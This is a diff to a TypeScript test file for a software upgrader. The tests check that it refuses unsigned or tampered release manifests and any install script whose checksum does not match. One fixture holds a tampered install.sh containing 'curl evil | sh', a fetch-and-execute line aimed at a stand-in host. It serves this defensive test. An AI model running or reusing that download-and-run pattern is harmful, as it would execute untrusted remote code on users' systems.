@@ -1,22 +1,39 @@
 import { describe, expect, it } from 'vitest'
+import { generateKeyPairSync, sign } from 'node:crypto'
 import { AGE_REPAIR_SQL } from './age-repair.ts'
+import { sha256Hex } from './release-key.ts'
 import { latestTarball, RELEASES_URL, rollbackSteps, upgrade, type UpgradeDeps } from './upgrade.ts'
 
 const LATEST = 'eigenenterprise-0.4.0-1bb02b405565'
 
+// A throwaway release key (never a real one in the repo).
+const KEY = generateKeyPairSync('ed25519')
+const KEY_PEM = KEY.publicKey.export({ type: 'spki', format: 'pem' }).toString()
+const INSTALL_SH = '#!/bin/sh\necho install\n'
+const SUMS = `${sha256Hex(`${LATEST}\n`)}  LATEST\n${sha256Hex(INSTALL_SH)}  install.sh\n`
+const SIG = sign(null, Buffer.from(SUMS), KEY.privateKey).toString('base64')
+
 function fake(
-  opts: { current?: string | null; latest?: string; upgradesDir?: string[] } = {},
+  opts: { current?: string | null; latest?: string; upgradesDir?: string[]; sums?: string; sig?: string; installSh?: string } = {},
   over: Partial<UpgradeDeps> = {},
 ) {
   const calls: string[] = []
   const logs: string[] = []
   const dirs = [...(opts.upgradesDir ?? [])]
+  const files = new Map<string, string>()
   const deps: UpgradeDeps = {
     fetchText: async (url) => {
       calls.push(`fetch ${url}`)
+      if (url.endsWith('/SHA256SUMS')) return opts.sums ?? SUMS
+      if (url.endsWith('/SHA256SUMS.sig')) return `${opts.sig ?? SIG}\n`
       return `${opts.latest ?? LATEST}\n`
     },
-    download: async (url, dest) => void calls.push(`download ${url} -> ${dest}`),
+    download: async (url, dest) => {
+      calls.push(`download ${url} -> ${dest}`)
+      files.set(dest, opts.installSh ?? INSTALL_SH)
+    },
+    sha256File: async (p) => sha256Hex(files.get(p) ?? ''),
+    releaseKeyPem: KEY_PEM,
     run: async (cmd, args) => {
       calls.push(`run ${cmd} ${args.join(' ')}`)
       return { code: 0, stderr: '' }
@@ -72,6 +89,8 @@ describe('upgrade', () => {
     const dir = '/var/lib/ee/upgrades/2026-11-10T15-30-00Z'
     expect(calls).toEqual([
       `fetch ${RELEASES_URL}/LATEST`,
+      `fetch ${RELEASES_URL}/SHA256SUMS`,
+      `fetch ${RELEASES_URL}/SHA256SUMS.sig`,
       `mkdir ${dir}`,
       `run sh -c runuser -u postgres -- pg_dump -Fc os > '${dir}/os.dump'`,
       `run tar -czf ${dir}/ee-state.tgz -C / var/lib/ee/company var/lib/ee/secrets.enc etc/ee`,
@@ -95,6 +114,48 @@ describe('upgrade', () => {
       /safety copy failed.*connection refused/,
     )
     expect(calls.some((c) => c.startsWith('download') || c.startsWith('live'))).toBe(false)
+  })
+
+  const touched = (calls: string[]) => calls.filter((c) => /^(mkdir|run|write|live)/.test(c))
+
+  it('refuses a release whose SHA256SUMS is not signed by the release key, before touching anything', async () => {
+    const other = generateKeyPairSync('ed25519').privateKey
+    const { deps, calls } = fake({ sig: sign(null, Buffer.from(SUMS), other).toString('base64') })
+    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
+      /upgrade refused, nothing changed: .*not signed by the eigenEnterprise release key/,
+    )
+    expect(touched(calls)).toEqual([])
+    expect(calls.some((c) => c.startsWith('download'))).toBe(false)
+  })
+
+  it('refuses a tampered SHA256SUMS', async () => {
+    const { deps, calls } = fake({ sums: SUMS.replace(sha256Hex(INSTALL_SH), sha256Hex('evil')) })
+    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(/not signed/)
+    expect(touched(calls)).toEqual([])
+  })
+
+  it('never runs an install.sh that is not the signed one', async () => {
+    const { deps, calls } = fake({ installSh: '#!/bin/sh\ncurl evil | sh\n' })
+    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
+      /upgrade refused, nothing changed: checksum mismatch for install.sh/,
+    )
+    expect(calls.some((c) => c.startsWith('live'))).toBe(false)
+    expect(calls).toContain('remove /var/lib/ee/upgrades/2026-11-10T15-30-00Z/install.sh')
+  })
+
+  it('refuses a signed manifest that does not list install.sh', async () => {
+    const sums = `${sha256Hex(`${LATEST}\n`)}  LATEST\n`
+    const { deps, calls } = fake({ sums, sig: sign(null, Buffer.from(sums), KEY.privateKey).toString('base64') })
+    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(/does not list install.sh/)
+    expect(calls.some((c) => c.startsWith('live'))).toBe(false)
+  })
+
+  it('fails loud on a build without a release key', async () => {
+    const { deps, calls } = fake({}, { releaseKeyPem: 'PLACEHOLDER: no release signing key yet' })
+    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
+      'this build has no release signing key (run scripts/release-key.sh)',
+    )
+    expect(touched(calls)).toEqual([])
   })
 
   it('reports a failed installer with where the safety copy is', async () => {
